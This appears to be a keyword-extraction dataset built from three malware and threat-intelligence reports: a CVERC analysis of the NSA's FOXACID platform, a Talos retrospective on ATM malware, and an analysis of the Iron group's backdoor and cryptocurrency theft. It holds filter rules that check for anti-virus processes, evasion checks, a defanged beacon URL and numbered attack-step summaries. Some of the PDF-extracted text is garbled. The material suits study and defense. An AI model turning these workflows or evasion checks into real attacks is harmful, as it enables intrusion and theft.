then inject the shellcode to the stream responded to the victim’s hosts.Step 3: Payload implantationFinds out whether the exploitation is success or fail. If succussed, certain types of persistent payloads will be implanted into the victim’s hosts. A user-interface is provided by FOXACID for configuration. In order to intercept and modify the victims’ sessions, CNE team create customized filters, which include following types:  Modrewrite: Replace matched resources in hijacked-sessions.  PreFilter: Decide whether the host is a vulnerable target or not. If not matched, 404 or 200 message (redirect to certain resources) will be responded. If matched, exploitation will be proceed automatically. PostFilter: If exploitation is succeed, decide whether the target is valuable andimplantable. If matched, certain malware as a payload will be delivered.ComponentsProject TrackerCNE teams manage FOXACID mission via Project Tracker, which is developed with PHP and Javascript. The Web interface of Project Tracker is fresh and simple, CNE operators could be easily aware of his own privileges based on background color. Red is read only, Green is modify, Black is admin. CNE operators are able to manage current projects, add a filter, add a project, add a server, add IPs of server, view projects that will start/end soon (3 days)Technical Analysis on FOXACID2National Computer Virus Emergency Response CenterTag MakerCNE teams add “Tags” to FA servers. Each tag has different TTPs (Technique, Tactic and Procedures). Distinguish attributions like TLN, HMAC and MSGID might be assigned to tags. MSGID refers to certain hacktool, for example, the MSGID of SECONDDATE, which targeting the Routers and Firewalls, is “ace02468bdf13579”. In addition, tags also define the types of deployment. For example, SECONDDATE and MAGICBEAN should be using the “(WEB)” Deployment Types. YATCHSHOP tags should have “SPAM” and QUANTUMINSERT shoud have “QI”.FABULOUSFABLE for SECONDDATEAs one of the most common weapons of CNE, SECONDDATE is mainly distributed via FOXACID. FABULOUSFABLE, AKA “FABFAB”, is used in automated SECONDDATE tasking. FABFAB interactive with SECONDDATE implants following a series of rules which had been configured by CNE operators, and collect the results, logs and data.ModrewritesModrewrites filters are able to replace resources from hijacked-sessions. The rules of modrewrites in XML format are similar with other filters. As shown in Figure 1, when certain rule is matched, the whole tag or only a certain portion of tag incoming to the FA server will be rewrite.<item name = “[path strings to be replaced]”/><action rating=“999” name=“[replaced path strings]”/>Figure 1. Rules of Modrewrites filtersCASTLECREEK WhitelistCASTLECREEK Whitelist filters take up a majority of the Postfilter, and it is configured to deploy certain payload to the host with certain IP, as shown in Figure 2. <filter lable=“IP Deploy Val-DH8” filterId=“FA-xxxxx-xxx-xxxx-xxxx-xxxx” enabled=“true”><filterMatch datatype=“socketip” matchType=“ip”> <item name=“[IP address of the target host]”/> <action rating=“XXXX” maxThreshold=“10” name=“[filename of payload]”/></filterMatch></filter>WrappersFigure 2. Rules of CASTLECREEK Whitelist filtersWrappers enable payload persistence. DireScallop, one of the Wrappers, is used to against targets that are using DeepFreeze products. DeepFreeze is used in many Internet cafes to prevent changes to a computer’s operating system and software applications. DireScallop is able to disable DeepFreeze without the need for a reboot. Implants can then immediately execute and re-enable DeepFreeze after gaining persistence. PayloadsSECONDDATETechnical Analysis on FOXACID3National Computer Virus Emergency Response CenterSECONDATE is a spyware which hide itself deeply in Routers and Firewalls with malicious activities of traffic interception, data exfiltration and modification.ValidatorValidator is a backdoor and as default payload of FOXACID.MistyVealMistyVeal is a larger implant than Validator. In order to avoid detection, it has a configurable call back time that can be changed with a granularity of increments in Days, Hours, or Minutes. MistyVeal cannot call out on the network on its own, instead, it call out on the network via Internet Explorer and reuse the proxy of Internet Explorer.Ferret CannonFerret Cannon is a malware loader. With the help of Ferret Cannon, spywares made by NSA like United Rake, Peddle Cheap, PktWench and Beach Head could be easily deployed and support executable file in “.dll” and “.exe”. Operation of FOXACID With public-disclosure from the NSA programs leaked by Snowden, we could take a glimpse of how FOXACID platform is operated. FOXACID Team One or more FOXACID coach and mentor are assigned to NSA TAO’s CNE team. Each coach and mentor manage one or more FOXACID team and receive FOXACID briefing from FOXACID team leader. The members of FOXACID team have different roles, including CNE operations support, infrastructure maintain and develop plugins, exploits, hacktools, trojans, backdoors, etc. Infrastructure As shown in Figure 3, TAO has deployed lots of FA servers. Servers with ID which has a prefix of “XS” were assigned with role of cross-mission control. What notable is a server with ID of “XS11” was assigned to GCHQ, a UK intelligence agency, for supporting MITMA mission. “FOX00-6000” series support SPAM mission, and were distributed in Middle-East, Asia, Europe, Russia and other particular regions. “FOX00-6100” series support MITMA mission with the same distribution as “FOX00-6000” series. “FOX00-6400” series support CNE mission, “FOX00-6401” targets China, “FOX00-6402” targets Russia, “FOX00-6403” targets other objects. In addition, “FOX00-6300” might be used for supporting missions called “ENCHANTED”.MissionServer XS10 YachrShop XS11 GCHQ MITM FOX00-6000 Test Server(Spam) FOX00-6001 FOX00-6002CT Spam ME SpamTechnical Analysis on FOXACID4National Computer Virus Emergency Response CenterFOX00-6003 FOX00-6403AA Spam Test Server(MITM) RU MITMEU MITM CT-MAC Test Server(Enchanted) CCNE OtherFigure 3. Distribution and Roles of FA serversCases of OperationCase 1<item name=""iexplore.exe"" /> //IE lable=”IEKAV_MV”filterId=""FA-a950dbf0-e918-4eb8-ab79-34bff13f50a1""<item name=""avp.exe"" /> //ProcessName of Kaspersky Anti-Virus software<filter lable=”Implant deployed – already, self or otherwise deleted” filterId=“FA-b91fb762-3fea- 4b6d-aa39-262312512625” enabled=“true”> <filterMatch dataType=”implant” matchType=”ci_string”/> <item name=”Mistyveal”/> <action rating=”1004” maxTime=”43200” includeTid=”true” name=”404”/> <filter lable=""tid match deploy MV - bad process 404"" filterId=""FA-1a3f9db0-5abd-4254-99a6- 01dc9f6e3eec"" enabled=""true""><filterMatch dataType=""process"" matchType=""ci_contains""> <filterMatch dataType=""process"" matchType=""ci_contains""> </filterMatch> </filterMatch><filterMatch dataType=""tid"" matchType=""ci_string""><item name=""177312""/> <!--foxtrack 1710--> <item name=""183556""/> <!--foxtrack 1897--> <item name=""183560""/> <!--foxtrack 1897-->Technical Analysis on FOXACID5National Computer Virus Emergency Response Center<item name=""183587""/> <!--foxtrack 1897--> <item name=""186675""/> <!--foxtrack 1897--> <item name=""186677""/> <!--foxtrack 1897--><filterMatch dataType=""process"" matchType=""ci_contains""><item name=""ccenter.exe""/> <!--foxtrack 1466 --> //ProcessName of Rising Anti-<item name=""ravmon.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""ravmond.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""ravstub.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""ravtask.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""ravxp.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-Virus software Anti-Virus software Anti-Virus software Anti-Virus software<item name=""ravservice.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising<item name=""ravtray.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""RavAlert.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""RavUpdate.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising<item name=""rfwproxy.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""rfwstub.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""rfwmain.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""rfwsrv.exe""/> <!--foxtrack 1466 --> // ProcessName of Rising Anti-<item name=""kvsrvxp.exe""/> <!--foxtrack 1466 --> // ProcessName of JiangminFigure 4. Case 1As a fragment of filter from FA server shown in Figure 4, we could easily find out that the FA server is supporting the CNE mission targeting hosts located in China. Apparently, the filter contains a lot of rules which intend to match popular Anti-Virus solutions in China, such as Rising and Jiangmin Company Limited (AS17557) attempting to attack the host with IP address of “203.99.164[.]199” and try to implant FerrentCannon into the target for more spywares deployment. And “203.99.164[.]199” is owned by Pakistan Telecommunication Company Limited (AS17557). Learned from above, we believe the project of FOXACID platform is still running by US government, and everyone should know the following facts:  FOXACID is a common cyber-weapon used by CNE team affiliated with TAO of NSA, and plays a vital role in globe cyber-espionage operated by NSA, especially against China and Russia. FOXACID adopts modular structure with features including high-scalability and cross-mission support when integrated with TAO’s project management instruments. FOXACID supports cross-platform attack, combined with other cyber-weapons of TAO, it is able to compromise any network devices. FOXACID is a veritable “Black Hole” of the internet.CVERC encourage all users from all over the world to be aware of the risk and the fact that Chinese research institutions were not the only victims. Organizations of governments, academies, business around the world might have been compromised by NSA with FOXACID. When running a new “Color Revolution” operation, FOXACID facilitates US intelligence agencies with the abilities to steal sensitive data at any time, and cause outage of critical infrastructures at war time.Technical Analysis on FOXACID7 ","{'phrases': ['NSA', 'TAO', 'reconnaissance', 'targets', 'filter', 'Red', 'sessions', 'MITM', 'FOXACID', 'the target', 'Shellcode', 'Payload', 'the exploit', 'Implants', 'SECONDDATE', 'Validator', 'monitoring', 'data exfiltration', 'Wrappers', 'DireScallop', 'persistence', 'DeepFreeze', 'Man', 'Operation', 'Project Tracker', 'infrastructure', 'Servers', 'spam', 'Post-Exploitation', '10', 'tag'], 'target': 'NSA; TAO; reconnaissance; targets; filter; Red; sessions; MITM; FOXACID; the target; Shellcode; Payload; the exploit; Implants; SECONDDATE; Validator; monitoring; data exfiltration; Wrappers; DireScallop; persistence; DeepFreeze; Man; Operation; Project Tracker; infrastructure; Servers; spam; Post-Exploitation; 10; tag.'}"
attackers; access; ATMs; ATM malware; systems; the Cen; XFS; code; Payload; cash; the machine; the user; the ATM; 10; a year.,[' 1. Attacker gains physical or network access to install ATM malware. 2. Malware intercepts card data or dispenses cash without authorization. 3. Money mules collect dispensed cash or use stolen card data for withdrawals. '],"Extract the keywords: 5/31/2019Talos Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…10 years of virtual dynamite: A high-level retrospective of ATM malwareblog.talosintelligence.com/2019/05/10-years-of-virtual-dynamite.htmlExecutive summary It has been 10 years since the discovery of Skimer, ﬁrst malware speciﬁcally designed to attack automated teller machines (ATMs). At the time, the learning curve for understanding its functionality was rather steep and analysis required speciﬁc knowledge of a manufacturer's ATM API functions and parameters, which were not publicly documented.Before the discovery of Skimer, anti-malware researchers' considered ATMs secure machines containing proprietary hardware, running non-standard operating systems, and implementing a number of advanced protection techniques designed to prevent attacks using malicious code. Researchers eventually discovered that the most popular ATM manufacturers use a standard Windows operating system and add on some auxiliary devices, such as a safe and card reader.Over time, actors behind some of the newer ATM malware families such as GreenDispenser and Tyupkin realized that there is a generic Windows extension for Financial Services API (CEN/XFS) that can be used to make malware that runs independent of the underlying hardware platform, as long as the ATM manufacturer supports the framework. This malware can trick the machines into dispensing cash, regardless of whether the attacker has a legitimate bank card.ATM malware has evolved to include a number of different families and different actors behind them, ranging from criminal groups to actors afﬁliated with nation states. The signiﬁcance of ATM malware stems from the fact that it can bring signiﬁcant ﬁnancialurl Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…beneﬁts to attackers and as a consequence cause a signiﬁcant damage to targeted banks, ﬁnancial institutions and end users.Now that this type of malware has been around for more than 10 years, we wanted to round up the speciﬁc families we've seen during that time and attempt to ﬁnd out if the different families share any code. ATM malware overviewSigniﬁcance ATM malware provided criminals with a subtler alternative to physically breaking into the safe built into the ATM. Before the appearance of ATM malware, criminals typically had to employ traditional ways of robbing ATMs, often pulling the physical device out of the ground or blowing it to pieces with dynamite. Obviously, these methods would quickly draw the attention of law enforcement and passersby.Over the past 10 years, we have seen a steady increase in the number of ATM malware samples discovered. Still, the number of discovered samples is very small compared to almost any other malware category.Number of ATM malware samples discovered year over year based on the year of ﬁrst submission to VirusTotal. As a digital substitute for dynamite, ATM malware allows criminals to employ money mules and instruct them how to dispense money from targeted ATMs. Typically, it happens by supplying a special authorisation code or card created to authorise the transaction.Before that, criminals had to infect the targeted ATM to install the code, which more often than not meant that they had to physically open the device to access its optical media reading devices or USB ports.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…There have been many reported attacks on various banking organizations throughout the world, but they seem to be more prevalent in Latin America and Eastern Europe, where the ATM infrastructure is older and are not regularly updated with security software or tamper-proof sensors. The damage caused by ATM malware to banks and individuals is rarely disclosed but it likely reaches millions of dollars a year.ATM malware affects banks and other ﬁnancial institutions, as well as the reputation of ATM manufacturers and individuals and companies whose account details are stolen in ATM malware attacks. There are several different ways we can classify ATM malware families. Based on its functionality, we can classify ATM malware into virtual skimmers and cash dispensers. The purpose of skimmers is to steal card and transaction details and individual PINs if the encryption keys used by pin pad are successfully retrieved.Cash-dispensing malware uses functions to allow for so-called ""jackpotting"" of ATMs where money is dispensed by attackers without the authorisation from the bank. But there are malware families that can steal card details and dispense cash.As far as the installation process is concerned, we again have two major groups. The ﬁrst one requires the attacker to physically access the device. The second group assumes that the attacker installs malware indirectly, typically by compromising the internal network of the bank and then targeting ATMs using stolen credentials.These types of malware will also either target speciﬁc models of ATMs, or will be more generic. Recently, ATM malware typically deploys generic functions.The most common framework is the CEN/XFS framework, which allows the developers of the ATM applications to compile and run their code regardless of the ATM model or the manufacturer but there are others, such as Kalignite framework built on top of XFS.The XFS API contains high-level functions for communicating with the various ATM modules such as the cash dispensing module (CDM), PIN pad (EPP4) or printer. The high-level functions are provided through a generic SDK, while the lower level functions, supplied through service providers, are developed by ATM manufacturers. The architecture is quite similar to Win32 architecture where the developers use the high- level API to communicate with the OS kernel and various device drivers provided by the manufacturers of the individual hardware components.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…High-level CEN/XFS architecture. Most ATM samples require physical access to the targeted ATM. ATMs are not typically connected to the internet and communicate with bank's central systems through specialized lines. However, most of the ATMs are connected to internal networks for their maintenance and administration so the second, smaller group of ATM malware may be introduced by compromising the internal network ﬁrst. This technique requires a higher level of sophistication but potentially brings higher returns if successful.Some generic hacking tools, such as Cobalt Strike, have reportedly been used for attacking ATMs and the transaction systems. This method has been more commonly used by more advanced groups such as Carbanak, Cobalt Gang and Lazarus (Group 77), whose Fastcash attack affects IBM AIX operating system, which is rarely targeted Notable ATM malware families and their functionality Over the past 10 years, we have seen more than 30 different ATM malware families. In this section, we will brieﬂy describe some of the more notable ones.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Number of ATM malware samples per family. Ploutus is the malware family with the largest number of discovered samples. The majority of them having been reported in Mexico. Ploutus is a standard ATM-dispensing malware. The attackers need to be able to access physical ports or a CD-ROM drive to be able to boot from it and modify the ATM system image to install the malware.Attackers allegedly used newer Ploutus variants to attack some U.S.-based ATMs. Ploutus.D communicates with the ATM using the multi-vendor KAL Kalignite framework, which allows it to work with ATMs from different vendors with minimal changes to its code base.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…One of the Ploutus variant's interface. Skimer is one of the ﬁrst ATM attacks, and bears all of the features of well-developed malware. Skimer functions as a virtual skimming device that attempts to steal bank card numbers and details of the account and owner details stored on the magnetic stripe tracks 1 and 2. A recent review of its functionality also indicates that it may also attempt to steal users' PINs by retrieving the encrypted pin pad encryption keys from the system.Apart from the virtual skimming function, Skimer acts as a backdoor to the ATM functionality for its operators — money mules employed to collect stolen data and dispense cash.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Main code loop for servicing Skimer's operators with cash. If the user knows the secret code to activate the backdoor, the malware displays a menu, which allows the operator to empty one of the four cash-dispensing modules (CDMs).The code locking the dispenser module and dispensing cash. Most of the other ATM malware families follow a similar principle. The attackers need to be able to physically access the ATM, which requires a key or drilling a hole to access speciﬁc ports or devices. Once the malware is deployed, the money mules need a speciﬁc code to access the menu and dispense cash.Tyupkin (Padpin)url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…The most interesting characteristic of Tyupkin is that it has the ability to limit its operation to speciﬁc hours and days of the week. It was reported that some Tyupkin instances can only be used on Sundays and Mondays at night.Tyupkin function for checking the hours of operation. Before dispensing cash, Tyupkin disables any network connections, presumably to prevent administrators from shutting down the ATM if a suspicious activity is detected.Some members of Tyupkin family are developed using C# and the .NET framework and some using Microsoft Visual C++. The family uses XFS API to manage infected ATMs and dispense cash in multiple currencies. Tyupkin has been active since 2014 and the associated gangs reportedly target Eastern European countries.Alice Alice follows a similar pattern to other ATM malware. It is installed by attackers and requires physical access to the system. When the operator launches it, Alice displays a window requiring a PIN.First Alice screen. If the code is correct, Alice will access the dispenser module and allow the operator to retrieve cash.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Main Alice UI window. Cutlet, or Cutlet Maker, has been sold as a do-it-yourself ATM malware kit on some underground markets since 2016. The bundle contains detailed instructions in Russian and English on how to infect systems and how to acquire codes required to dispense cash.Main Cutlet Maker user interface. The Cutlet manual details operational security practices required to avoid being caught by law enforcement ofﬁcers and shows where to drill holes in the ATM enclosure in order to access USB ports of a speciﬁc ATM model. The kit also contains a testing application named ""Stimulator"" for users to practice before they decide to conduct real attacks.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Cutlet follows a similar pattern to the previous ATM malware. The owner of the kit has the ability to generate codes per ATM required for its operation.Fastcash The signiﬁcance of Fastcash malware is its mode of operation and its targeting of IBM AIX operating system. Fastcash consists of a process injector and shared objects presumably injected into the process space of compromised bank payment authorization systems. The malware monitors ISO8583-based transactions using code from a fairly old open-source library for parsing ISO8583 packets.If an ATM transaction contains the attackers' codes, the data will not be forwarded to the original payment authorisation application and the transaction approval will be sent back to the target ATM system allowing attackers to dispense cash.This mode of operation is similar to some rootkits, where malware attempts to hide its presence on the system by modifying the responses sent back from the operating system to the application that attempts to list system objects such as ﬁles or processes. The returned list is usually modiﬁed to remove names of processes that belong to the malware.Fastcash has been attributed to the Lazarus Group and it is an example of a nation- state-related actor targeting ﬁnancial systems for the attacker's ﬁnancial beneﬁt. Fastcash shows a level of sophistication and knowledge that is not seen in other, run-of- the-mill, ATM malware. Code sharing between families Thanks to Xylitol and the ATM Cybercrime tracker, it was easy to retrieve a fairly complete ATM malware data set, with the addition of the few ﬁles connected with the Fastcash campaign.The data set contains 121 ﬁles and it is well suited for analysis and clustering. Out of 121 ﬁles, there are 114 PE ﬁles and those were used for clustering using the static analysis techniques. Out of 114 PE ﬁles there were 37 packed ﬁles which may not be suitable for static analysis techniques and 20 DLLs.While investigating various methods for clustering, we stumbled upon an interesting book, ""Malware Data Science"" by Joshua Saxe and Hillary Sanders. This book shows basic and more advanced methods for classifying and clustering malicious ﬁles and used some of the ideas to cluster our own set.In our case, the clustering was conducted by extracting the following attributes of each sample:Strings extracted from the ﬁle Disassembled code from the entry point of the ﬁle File entropy and the presence of a known packer Imported or exported functions Embedded resourcesurl Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…After collecting the attributes from each sample, Jaccard distance is calculated for every pair of the ﬁles in the set. The Jaccard index is a measure of similarity between two sets. The more similar the two samples are, the higher their Jaccard index will be. The index is a number between 0 and 1. For example, the Jaccard index of 0.5 indicates 50 percent overlap between the two sets.Clusters with Jaccard index threshold of 0.7. We need to set the threshold required for two samples to be connected as a part of a single cluster. The higher the Jaccard threshold we choose, the more related will be the members of the deﬁned cluster. By varying the threshold we come to the optimal value for our purpose. For example, for correct classiﬁcation of samples we should choose the value higher than 0.7, and for code sharing purposes, higher than 0.3.As expected, the results show that as we lower the thresholds we see more clusters appear and some of the clusters show overlap between distinct ATM malware families.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Clusters with Jaccard index threshold of 0.3.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…The width of the lines in the graph show how strongly the ﬁles in the clusters are related. For example, we see that the members of individual GreenDispenser, Tyupkin or DispCash clusters are very closely related, while mixed Ligsterac/Skimer, Tyupkin/Dispcash and ATMtest/Helloworld clusters show weaker connections that likely indicate some overlap in the malware code. Protection and detection best practices When considering protection and detection of attacks with ATM malware, it is important to consider the physical security of ATMs, the security of software running on the system and the security of any segment of the organization's network that communicates with ATMs.Here are 15 best practices that organizations should follow when considering protection of ATMs networks and successful and timely detection of attacks when they happen.Ensure ATMs and all related systems run up-to-date software and the latest operating system versions with the latest security patches applied. Disable Windows AutoPlay and conﬁgure BIOS to disable the ability to boot software from USB sticks and CD/DVD drives. Set strong BIOS password protection to prevent boot settings from being changed. Disable access to the Windows desktop at the ATM, ensure RDP sessions are secured with multiple authentication factors such as Duo Authentication for Windows Logon and RDP. Remove any unused services and applications from the system to reduce the attack surface. Implement other measures to harden the underlying ATM operating system. Monitor the operation of ATMs, as well as their physical integrity. Look for unusual patterns of resets, communication failures and transaction volume. Implement strong encryption between the ATM and the host. Ensure access to the ATM cabinet is restricted to authorized persons and that such access is electronically logged. Perform a security assessment of ATMs, including their physical locations and any networks connecting to them. Ensure that ﬁrewalls and anti-malware protection are correctly conﬁgured. Conﬁgure whitelisting solutions or operating system features to allow only known, trusted software to run. Make sure that whitelisting cannot be disabled without generating a remote log entry. Prevent unauthorized USB devices from being installed using a device control function. Educate employees about how they can avoid introducing malware into operational systems. Maintain a physically and logically segmented network environment throughout the organization using segmentation technology such as Cisco TrustSec. Ensure visibility over network trafﬁc to ATM systems and payment authorisation servers using technology that enhance network visibility, such as Cisco Stealthwatch.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Monitor threat intelligence feeds to learn about newly detected ATM malware ATM malware is a niche area attacks, but it potentially brings signiﬁcant beneﬁts to actors that successfully manage to deploy it. Over 10 years since the discovery of the ﬁrst specialized malicious code targeting the Diebold Agilis line of ATMs, we have seen over 30 other malware families with varying degrees of sophistication, complexity and success. Most of the successful attacks are reported in countries where the ATMs are older, such as some Latin American countries and Eastern Europe.While the majority of actors behind ATM malware seem to be less sophisticated criminal actors, the potential of being able to dispense large amounts of cash also attracts more sophisticated criminal groups such as Carbanak and Cobalt Gang, as well as some state-sponsored actors such as Lazarus.Although the number of known malware samples for ATMs has been very low there has been a steady increase in the trendline for number of discovered samples year over year.Financial organizations and banks have to be particularly vigilant when considering protection against malware for ATMs and payment systems. Enterprises and individuals may also experience ﬁnancial loss due to potential of their card details being used for illegal transactions after being skimmed by ATM malware. Best practices should be followed to ensure the highest possible level of protection and organizations should invest into increasing user awareness about the dangers of ATM malware. Additional ways our customers can detect and block these threats are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here.Cisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.url Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: 10 years of virtual dynamite: A high-level retrospective of ATM…Network Security appliances such asNext-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Subscriber Rule Set customers can stay up to date byOpen Source SNORT downloading the latest rule pack available for purchase on Snort.org. ","{'phrases': ['Attacker', 'access', 'ATM malware', 'card', 'dispense', 'cash', 'authorization', 'money mules'], 'target': 'Attacker; access; ATM malware; card; dispense; cash; authorization; money mules.'}"
PE; Installer; UPX; malware; Temp; Chrome extension; RCS; VM; check; control; a scheduled task; The backdoor; dll; DLL; control; attackers; HTTPS; TCP; encryption; command; control; HTTPS; HTTPS; commands; Webshells; malware; persistence; reboots; a scheduled task; a scheduled task; C2 server; HTTPS; requests; requests; GET; GET; system info; GET; HTTPS; 286; requests; COM; execution; 10; Run; 11; files; 11; services; 12.,['1. The malware installer drops and installs a malicious Chrome extension for stealthy crypto-mining. 2. It extracts the extension to local Chrome folders and sets up auto-execution. 3. The installer drops the Iron backdoor DLL and achieves persistence. 4. The backdoor installs Xagent crypto-miner or Iron ransomware. 5. It steals cryptocurrency wallet files by searching for wallet signatures. 6. The malware hijacks crypto transactions by replacing wallet addresses in the clipboard. 7. The backdoor uses a Pastebin account and proxies for command and control. 8. Anti-analysis measures like anti-VM checks avoid detection. 9. The malware leverages stolen HackingTeam code for stealth. '],"Extract the keywords: HomeProducts & ServicesTechnologyCompanyBlogResourcesTry it nowBlog Cybersecurity DNAIron Cybercrime Group Under The ScopePDFmyURL converts any url to pdf!Omri Ben Bassat 29.05.18 | 11:53 amShare:In April 2018, while monitoring public data feeds, we noticed an interesting and previously unknown backdoor using HackingTeam’s leaked RCS source code. We discovered that this backdoor was developed by the Iron cybercrime group, the same group behind the Iron ransomware (rip-off Maktub ransomware recently discovered by Bart Parys), which we believe has been active for the past 18 months.During the past year and a half, the Iron group has developed multiple types of malware (backdoors, crypto-miners, and ransomware) for Windows, Linux and Android platforms. They have used their malware to successfully infect, at least, a few thousand victims.In this technical blog post we are going to take a look at the malware samples found during the research.Technical Analysis: Installer:** This installer sample (and in general most of the samples found) is protected with VMProtect then compressed using UPX.Installation process: 1. Check if the binary is executed on a VM, if so – ExitProcess2. Drop & Install malicious chrome extension %localappdata%\Temp\chrome.crx 3. Extract malicious chrome extension to %localappdata%\Temp\chrome & create a scheduled task to execute %localappdata%\Temp\chrome\sec.vbs. 4. Create mutex using the CPU’s version to make sure there’s no existing running instance of itself. 5. Drop backdoor dll to %localappdata%\Temp\\<random>.dat. 6. Check OS version:PDFmyURL converts any url to pdf!.If Version == Windows XP then just invoke ‘Launch’ export of Iron Backdoor for a one-time non persistent execution. .If Version > Windows XP -Invoke ‘Launch’ export -Check if Qhioo360 – only if not proceed, Install malicious certificate used to sign Iron Backdoor binary as root CA.Then create a service called ‘helpsvc’ pointing back to Iron Backdoor dll.PDFmyURL converts any url to pdf!Using the leaked HackingTeam source code: Once we Analyzed the backdoor sample, we immediately noticed it’s partially based on HackingTeam’s source code for their Remote Control System hacking tool, which leaked about 3 years ago. Further analysis showed that the Iron cybercrime group used two main functions from HackingTeam’s source in both IronStealer and IronPDFmyURL converts any url to pdf!ransomware.1.Anti-VM: Iron Backdoor uses a virtual machine detection code taken directly from HackingTeam’s “Soldier” implant leaked source code. This piece of code supports detecting Cuckoo Sandbox, VMWare product & Oracle’s VirtualBox. Screenshot:2. Dynamic Function Calls: Iron Backdoor is also using the DynamicCall module from HackingTeam’s “core” library. This module is used to dynamically call external library function by obfuscated the function name, which makes static analysis of this malware more complex. In the following screenshot you can see obfuscated “LFSOFM43/EMM” and “DsfbufGjmfNbqqjohB”, which represents “kernel32.dll” and “CreateFileMappingA” API.PDFmyURL converts any url to pdf!For a full list of obfuscated APIs you can visit obfuscated_calls.h.Malicious Chrome extension: A patched version of the popular Adblock Plus chrome extension is used to inject both the in-browser crypto-mining module (based on CryptoNoter) and the in-browser payment hijacking module.**patched include.preload.js injects two malicious scripts from the attacker’s Pastebin account.The malicious extension is not only loaded once the user opens the browser, but also constantly runs in the background, acting as a stealth host based crypto-miner. The malware sets up a scheduled task that checks if chrome is already running, every minute, if it isn’t, it will “silent-launch” it as you can see in the following screenshot:PDFmyURL converts any url to pdf!Internet Explorer(deprecated):Iron Backdoor itself embeds adblockplusie – Adblock Plus for IE, which is modified in a similar way to the malicious chrome extension, injecting remote javascript. It seems that this functionality is no longer automatically used for some unknown reason.Persistence: Before installing itself as a Windows service, the malware checks for the presence of either 360 Safe Guard or 360 Internet Security by reading following registry keys:.SYSTEM\CurrentControlSet\Services\zhudongfangyu. .SYSTEM\CurrentControlSet\Services\360rpIf one of these products is installed, the malware will only run once without persistence. Otherwise, the malware will proceed to installing rouge, hardcoded root CA certificate on the victim’s workstation. This fake root CA supposedly signed the malware’s binaries, which will make them look legitimate.Comic break: The certificate is protected by the password ‘caonima123’, which means “f*ck your mom” in Mandarin.IronStealer (<RANDOM>.dat): Persistent backdoor, dropper and cryptocurrency theft module.1. Load Cobalt Strike beacon: The malware automatically decrypts hard coded shellcode stage-1, which in turn loads Cobalt Strike beacon in-memory, using a reflective loader:PDFmyURL converts any url to pdf!Beacon: hxxp://dazqc4f140wtl.cloudfront[.]net/ZZYO2. Drop & Execute payload: The payload URL is fetched from a hardcoded Pastebin paste address:We observed two different payloads dropped by the malware:1. Xagent – A variant of “JbossMiner Mining Worm” – a worm written in Python and compiled using PyInstaller for both Windows and Linux platforms. JbossMiner is using known database vulnerabilities to spread. “Xagent” is the original filename Xagent<VER>.exe whereas <VER> seems to be the version of the worm. The last version observed was version 6 (Xagent6.exe).PDFmyURL converts any url to pdf!**Xagent versions 4-6 as seen by VT2. Iron ransomware – We recently saw a shift from dropping Xagent to dropping Iron ransomware. It seems that the wallet & payment portal addresses are identical to the ones that Bart observed. Requested ransom decreased from 0.2 BTC to 0.05 BTC, most likely due to the lack of payment they received.PDFmyURL converts any url to pdf!**Nobody paid so they decreased ransom to 0.05 BTC3. Stealing cryptocurrency from the victim’s workstation: Iron backdoor would drop the latest voidtool Everything search utility and actually silent install it on the victim’s workstation using msiexec. After installation was completed, Iron Backdoor uses Everything in order to find files that are likely to contain cryptocurrency wallets, by filename patterns in both English and Chinese.Full list of patterns extracted from sample: – Etherenum keystore filename – *litecoin*.txtPDFmyURL converts any url to pdf!– **.txt – *coinbase*4. Hijack on-going payments in cryptocurrency: IronStealer constantly monitors the user’s clipboard for Bitcoin, Monero & Ethereum wallet address regex patterns. Once matched, it will automatically replace it with the attacker’s wallet address so the victim would 